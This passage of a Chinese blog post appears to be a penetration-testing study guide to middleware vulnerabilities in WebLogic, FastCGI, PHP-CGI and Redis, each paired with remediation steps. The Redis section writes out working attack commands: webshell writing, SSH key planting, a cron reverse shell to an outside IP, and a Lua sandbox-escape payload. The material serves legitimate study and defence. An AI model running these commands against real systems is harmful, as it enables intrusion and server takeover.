+<p>2）对访问wls-wsat的资源进行访问控制。</p>
+<h4 id="2ssrf" class="headerLink">
+    <a href="#2ssrf" class="header-mark"></a>2、SSRF</h4><p>Weblogic 中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p>
+<p><strong>修复方法：</strong></p>
+<p>方法一：</p>
+<p>以修复的直接方法是将SearchPublicRegistries.jsp直接删除就好了；</p>
+<p>方法二：</p>
+<p>1）删除uddiexplorer文件夹</p>
+<p>2）限制uddiexplorer应用只能内网访问</p>
+<p>方法三：（常用）</p>
+<p>Weblogic服务端请求伪造漏洞出现在uddi组件（所以安装Weblogic时如果没有选择uddi组件那么就不会有该漏洞），更准确地说是uudi包实现包uddiexplorer.war下的SearchPublicRegistries.jsp。方法二采用的是改后辍的方式，修复步骤如下：</p>
+<p>1）将weblogic安装目录下的wlserver_10.3/server/lib/uddiexplorer.war做好备份</p>
+<p>2）将weblogic安装目录下的server/lib/uddiexplorer.war下载</p>
+<p>3）用winrar等工具打开uddiexplorer.war</p>
+<p>4)将其下的SearchPublicRegistries.jsp重命名为SearchPublicRegistries.jspx</p>
+<p>5）保存后上传回服务端替换原先的uddiexplorer.war</p>
+<p>6）对于多台主机组成的集群，针对每台主机都要做这样的操作</p>
+<p>7）由于每个server的tmp目录下都有缓存所以修改后要彻底重启weblogic（即停应用—停server—停控制台—启控制台—启server—启应用）</p>
+<h4 id="3任意文件上传" class="headerLink">
+    <a href="#3%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" class="header-mark"></a>3、任意文件上传</h4><p>通过访问config.do配置页面，先更改Work Home工作目录，用有效的已部署的Web应用目录替换默认的存储JKS Keystores文件的目录，之后使用”添加Keystore设置”的功能，可上传恶意的JSP脚本文件。</p>
+<p><strong>修复方法：</strong></p>
+<p>方案1：</p>
+<p>使用Oracle官方通告中的补丁链接：</p>
+<p><a href="http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html" target="_blank" rel="noopener noreferrer">http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html</a></p>
+<p><a href="https://support.oracle.com/rs?type=doc&amp;id=2394520.1" target="_blank" rel="noopener noreferrer">https://support.oracle.com/rs?type=doc&id=2394520.1</a></p>
+<p>方案2:</p>
+<p>1）进入Weblogic Server管理控制台；</p>
+<p>2）domain设置中，启用”生产模式”。</p>
+<h4 id="4war后门文件部署" class="headerLink">
+    <a href="#4war%e5%90%8e%e9%97%a8%e6%96%87%e4%bb%b6%e9%83%a8%e7%bd%b2" class="header-mark"></a>4、war后门文件部署</h4><p>由于WebLogic后台存在弱口令，可直接登陆后台上传包含后门的war包。</p>
+<p><strong>修复方法：</strong></p>
+<p>防火墙设置端口过滤，也可以设置只允许访问后台的IP列表，避免后台弱口令。</p>
+<h3 id="0x7-fastcgi" class="headerLink">
+    <a href="#0x7-fastcgi" class="header-mark"></a>0x7 FastCGI</h3><h4 id="未授权访问命令执行" class="headerLink">
+    <a href="#%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" class="header-mark"></a>未授权访问、命令执行</h4><p>服务端使用fastcgi协议并对外网开放9000端口，可以构造fastcgi协议包内容，实现未授权访问服务端.php文件以及执行任意命令。</p>
+<p>**修复方法：**更改默认端口</p>
+<h3 id="0x8-phpcgi" class="headerLink">
+    <a href="#0x8-phpcgi" class="header-mark"></a>0x8 PHPCGI</h3><h4 id="远程代码执行" class="headerLink">
+    <a href="#%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c" class="header-mark"></a>远程代码执行</h4><p>在apache调用php解释器解释.php文件时，会将url参数传我给php解释器，如果在url后加传命令行开关（例如-s、-d 、-c或-dauto_prepend_file%3d/etc/passwd+-n）等参数时，会导致源代码泄露和任意代码执行。</p>
+<p>此漏洞影响php-5.3.12以前的版本，mod方式、fpm方式不受影响。</p>
+<p><strong>修复方法：</strong></p>
+<p>三种方法：</p>
+<p>1）升级php版本；（php-5.3.12以上版本）;</p>
+<p>2）在apache上做文章，开启url过滤，把危险的命令行参数给过滤掉，由于这种方法修补比较简单，采用比较多吧。</p>
+<p>具体做法：</p>
+<p>修改http.conf文件，找到增加以下三行</p>
+<p>RewriteEngine on</p>
+<p>RewriteCond %{QUERY_STRING} ^(%2d|-)[^=]+$ [NC]</p>
+<p>RewriteRule ^(.*) $1? [L]</p>
+<p>重启一下apache即可，但是要考虑到，相当于每次request就要进行一次url过滤，如果访问量大的话，可能会增加apache的负担。</p>
+<p>3）打上php补丁。</p>
+<p>补丁下载地址:https://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/</p>
+<h3 id="0x9-redis" class="headerLink">
+    <a href="#0x9-redis" class="header-mark"></a>0x9 Redis</h3><p>redis是用ANSI C语言编写、支持网络、可基于内存和可持久化的日志型键值对数据库，是一个<strong>key-value</strong>存储系统。并提供多种语言的API。reids默认端口是<strong>6379</strong>。造成未授权漏洞的原因不是逻辑漏洞，是安全配置未作限制。</p>
+<h4 id="1未授权访问漏洞" class="headerLink">
+    <a href="#1%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e6%bc%8f%e6%b4%9e" class="header-mark"></a>1、未授权访问漏洞</h4><p>redis未授权访问漏洞是由于redis服务器版本较低，默认情况下，会绑定在0.0.0.0:6379，如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网上；如果没有设置密码认证（一般为空）的情况下，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据。</p>
+<p><strong>漏洞成因</strong></p>
+<ul>
+<li>redis为4.x/5.x或以前的版本</li>
+<li>redis绑定在0.0.0.0:6379，并且没有添加防火墙规则来避免其他非信任来源ip的访问，直接暴露在公网</li>
+<li>没有设置密码认证，可以免密码远程登录redis服务</li>
+</ul>
+<p><strong>漏洞危害</strong></p>
+<ul>
+<li>攻击者可以通过redis命令向目标服务器写入计划任务，让服务器主动连接攻击者，实现反弹shell，完成对服务器的控制</li>
+<li>攻击者可以通过redis命令向网站目录写入webshell，完成对目标网站服务器的初步控制。即可以通过redis服务间接利用http服务。</li>
+<li>当redis以root身份运行时，攻击者可以给root用户写入ssh公钥文件，直接通过ssh远程登录受害服务器</li>
+</ul>
+<h4 id="2redis写入webshell" class="headerLink">
+    <a href="#2redis%e5%86%99%e5%85%a5webshell" class="header-mark"></a>2、redis写入webshell</h4><p><strong>redis存在未授权访问</strong>，并且<strong>开启了web服务</strong>，<strong>知道了web目录的路径</strong>，并<strong>具有文件读写增删改查的权限</strong>，即可通过redis在指定的web目录下<strong>写入一句话木马</strong>，用蚁剑连接可达到控制服务器的目的。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">config</span> <span class="n">set</span> <span class="n">dir</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span>   <span class="o">//</span><span class="err">切换到网站的根目录</span>
+</span></span><span class="line"><span class="cl"><span class="n">config</span> <span class="n">set</span> <span class="n">dbfilename</span> <span class="n">zcc</span><span class="o">.</span><span class="n">php</span>   <span class="o">//</span><span class="err">在磁盘中生成木马文件</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">xxx</span> <span class="s2">&#34;</span><span class="se">\n\n\n</span><span class="s2">&lt;?php @eal($_POST[&#39;zcc&#39;]);?&gt;</span><span class="se">\n\n\n</span><span class="s2">&#34;</span>    <span class="o">//</span><span class="err">写入恶意代码到内存中，这里的</span>\<span class="n">n</span>\<span class="n">n</span>\<span class="n">n代表换行的意思</span><span class="err">，用</span><span class="n">redis写入文件的会自带一些版本信息</span><span class="err">，如果不换行可能会导致无法执行</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">save</span>    <span class="o">//</span><span class="err">将内存中的数据导出到磁盘</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="3redis写入ssh公钥登录" class="headerLink">
+    <a href="#3redis%e5%86%99%e5%85%a5ssh%e5%85%ac%e9%92%a5%e7%99%bb%e5%bd%95" class="header-mark"></a>3、redis写入ssh公钥登录</h4><p>在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为**/root/.ssh<strong>和默认的缓冲文件</strong>authorized.keys**，把缓冲的数据保存在文件里，这样就可以在服务器端的**/root/.ssh**下生成一个授权的key。</p>
+<p><strong>写入公钥的前提：</strong>
+● Redis服务使用root账号启动
+● 成功连接redis
+● 服务器开放了SSH服务，而且允许使用密钥登录，并且存在/root/.ssh目录，（安装的openssh只要
+将公钥放入到/root/.ssh文件夹中，无需设置 默认就允许使用公钥登录），即可远程写入一个公钥，直接登录远程服务器。
+攻击机上创建ssh-rsa密钥，也就是生成key，这里密码搞成空，全部默认即可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ssh-keygen -t rsa
+</span></span><span class="line"><span class="cl">config set dir /root/.ssh/
+</span></span><span class="line"><span class="cl">config set dbfilename authorized_keys# set x &#34;\n\n\n公钥\n\n\n&#34;，将公钥写入x键。前后用\n换行，避免和Redis里其他缓存数据混合
+</span></span><span class="line"><span class="cl">set x &#34;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCiRdspB+toUvUw1pvmizU3XUk9tEF8Dvu/u2Ro9wOYlFWL+JsEI8IWbnQY8YenPZStJMQGu0onJML+fM475Prd6llv3gOZL45P07Xv03MqVcrU0BrFxmtXd9fr91Sl5kPNME9A2LrfmWszkELGDn+RJPSTGXvB8yKTJ2TjwP2Bn6RbVCtOpX3bkaCFja4MvjxeDat0yYFRw9SOUE1UEU3jsX0jvIjhjDlcOhOtsHgB3rCyN+U6sY8T9IzmFaw7BjufHEpTiErx5NDOW/FjQsEuX2eCX6w3RxCdso1oceVhG+5VbsorEi01ddSEGubK4ZvMB0/kwJu0e1dozaJZOIKxxxx7zhdVjHb0zJQzbqqzwbMe54dsGerQA1BCnLF/axmt13BNZKXgBIcaxtPx7Ik7ekigjn/T6ldlguZXUup+yI8g8nzJEkI6PFNc+UYl+SY1cqpCmPQv2CGP8FcD++VBmxf0hh8AzO4jdbfZZIqpBqqhtVKeHLXMcV7OXCFM= red@sxxc\n\n\n&#34;
+</span></span><span class="line"><span class="cl">save
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>连接:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ssh -i id_rsa root@ip
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="4写入计划任务反弹shell" class="headerLink">
+    <a href="#4%e5%86%99%e5%85%a5%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1%e5%8f%8d%e5%bc%b9shell" class="header-mark"></a>4、写入计划任务反弹shell</h4><p>原理就是在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">set</span> <span class="n">x</span> <span class="s2">&#34;</span><span class="se">\n\n</span><span class="s2">*/1 * * * * bash -i &gt;&amp; /dev/tcp/43.xx.x7/8089 0&gt;&amp;1</span><span class="se">\n\n</span><span class="s2">&#34;</span>  <span class="o">//</span>\<span class="n">n为换行符</span><span class="err">，此处一定要加</span>\<span class="n">n</span><span class="err">，这样反弹</span><span class="n">shell语句与其他乱码语句就会分隔开不在同一行</span><span class="err">，这样才能成功反弹</span><span class="n">shell</span>
+</span></span><span class="line"><span class="cl"><span class="n">config</span> <span class="n">setdir</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">cron</span>
+</span></span><span class="line"><span class="cl"><span class="n">config</span> <span class="n">set</span> <span class="n">dbfilename</span> <span class="n">root</span>
+</span></span><span class="line"><span class="cl"><span class="n">save</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>反弹shell这里只在centos中能够利用成功，ubuntu系统由于通过redis写入计划任务后乱码原因导致无法反弹成功。</p>
+<h4 id="5主从复制rce" class="headerLink">
+    <a href="#5%e4%b8%bb%e4%bb%8e%e5%a4%8d%e5%88%b6rce" class="header-mark"></a>5、主从复制rce</h4><p>漏洞存在于4.x、5.x版本中，Redis提供了<strong>主从模式</strong>，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。</p>
+<p><strong>利用前提:</strong></p>
+<p>1.redis 4.x/5.x
+2.无需root账号启动redis，普通权限也可以</p>
+<blockquote>
+<p><strong>什么是主从复制?</strong>
+主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。
+Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis</p>
+</blockquote>
+<h4 id="6ssrfredis写入webshell" class="headerLink">
+    <a href="#6ssrfredis%e5%86%99%e5%85%a5webshell" class="header-mark"></a>6、ssrf+redis写入webshell</h4><p>当我们检测出一个网站存在SSRF漏洞的时候，我们就可以探测当前或者内网主机开放的端口，而这些端口往往我们从外网是不能直接探测到的，所以可以尝试利用ssrf探测内网开放的端口，当探测处内网存在redis的时候，则可以尝试进行攻击。</p>
+<h4 id="7redis-lua-沙盒绕过rce" class="headerLink">
+    <a href="#7redis-lua-%e6%b2%99%e7%9b%92%e7%bb%95%e8%bf%87rce" class="header-mark"></a>7、Redis Lua 沙盒绕过rce</h4><p>CVE-2022-0543漏洞影响的版本只限于Debian 和 Debian 派生的 Linux 发行版（如Ubuntu）上的 Redis 服务。</p>
+<p>安全研究人员发现在 Debian 上，Lua 由 Redis 动态加载，且在 Lua 解释器本身初始化时，module和require以及package的Lua 变量存在于上游Lua 的全局环境中，而不是不存在于 Redis 的 Lua 上，并且前两个全局变量在上个版本中被清除修复了，而package并没有清楚，所以导致redis可以加载上游的Lua全局变量package来逃逸沙箱。</p>
+<p>利用<strong>luaopen_io</strong>函数，执行代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">eval</span> <span class="s1">&#39;local io_l = package.loadlib(&#34;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&#34;, &#34;luaopen_io&#34;); </span>
+</span></span><span class="line"><span class="cl"><span class="n">local</span> <span class="n">io</span> <span class="o">=</span> <span class="n">io_l</span><span class="p">();</span> 
+</span></span><span class="line"><span class="cl"><span class="n">local</span> <span class="n">f</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&#34;id&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="n">local</span> <span class="n">res</span> <span class="o">=</span> <span class="n">f</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">&#34;*a&#34;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="p">:</span><span class="n">close</span><span class="p">();</span> 
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">res</span><span class="s1">&#39; 0</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>前提都是需要知道<strong>package.loadlib</strong>的路径。</p>
+<h4 id="8redis防御" class="headerLink">
+    <a href="#8redis%e9%98%b2%e5%be%a1" class="header-mark"></a>8、Redis防御</h4><ol>
+<li>绑定本地和内网ip地址进行访问,如本地ip：127.0.0.1，192.168.54.1</li>
+<li>requirepass设置redis密码，（默认为空）</li>
+<li>保护模式开启protected-mode开启（默认开启）</li>
+<li>更改默认端口（6379）</li>
+<li>避免使用root权限使用</li>
+</ol>
+<p>【参考资料】：</p>
+<p><a href="https://cloud.tencent.com/developer/article/1423284" target="_blank" rel="noopener noreferrer">FreeBuf《Web中间件常见漏洞总结》</a></p>
+<p><a href="https://blog.csdn.net/weixin_44288604/article/details/121568508" target="_blank" rel="noopener noreferrer">CSDN《中间件漏洞汇总》</a></p>
+<p><a href="https://blog.csdn.net/qq_44159028/article/details/127379013?app_version=5.8.1&amp;code=app_1562916241&amp;csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22127379013%22%2C%22source%22%3A%22weixin_52118430%22%7D&amp;uLinkId=usr1mkqgl919blen&amp;utm_source=app" target="_blank" rel="noopener noreferrer">redis漏洞利用总结</a></p>
+<p><a href="https://blog.csdn.net/qq_44159028/article/details/117034100?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166599741516800184192907%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=166599741516800184192907&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-117034100-null-null.nonecase&amp;utm_term=ssrf%20redis&amp;spm=1018.2226.3001.4450" target="_blank" rel="noopener noreferrer">SSRF攻击Redis写入webshell</a></p></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-12-17&nbsp;<a class="git-hash" href="https://github.com/HEIGE-PCloud/DoIt/commit/969375dd70cd7acbf2e549364429ffcb642588c5" target="_blank" title="commit by scofield(scofield_1920@outlook.com) 969375dd70cd7acbf2e549364429ffcb642588c5: data" rel="noopener noreferrer">
+                                    <i class="fas fa-hashtag fa-fw"></i>969375d</a></span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/hvv_middleware_bug/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
+                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\hvv_middleware_bug.md target="_blank" rel="noopener noreferrer">View source</a>
+                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\hvv_middleware_bug.md target="_blank" rel="noopener noreferrer">Edit this page</a>
+                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%20hvv_%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E&body=|Field|Value|%0A|-|-|%0A|Title|hvv_%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E|%0A|Url|http://scofield1920.github.io/hvv_middleware_bug/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\hvv_middleware_bug.md| target="_blank" rel="noopener noreferrer">Report issue</a>
+                    </span></div>
+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/hvv_middleware_bug/" data-title="hvv_中间件漏洞" data-hashtags="hvv"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/hvv_middleware_bug/" data-hashtag="hvv"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/hvv_middleware_bug/" data-title="hvv_中间件漏洞"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/hvv_middleware_bug/" data-title="hvv_中间件漏洞"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/hvv_middleware_bug/" data-title="hvv_中间件漏洞"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/hvv_middleware_bug/" data-title="hvv_中间件漏洞" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;hvv_中间件漏洞&#34;, &#34;http://scofield1920.github.io/hvv_middleware_bug/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/hvv/">hvv</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/hvv_post_penetration/" class="prev" rel="prev" title="hvv_后渗透"><i class="fas fa-angle-left fa-fw"></i>hvv_后渗透</a>
+            <a href="/hvv_owasptop10/" class="next" rel="next" title="hvv_OWASP_TOP10">hvv_OWASP_TOP10<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.120.4">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"Sc0fie1d-Blog","mobile-header-typeit":"Sc0fie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
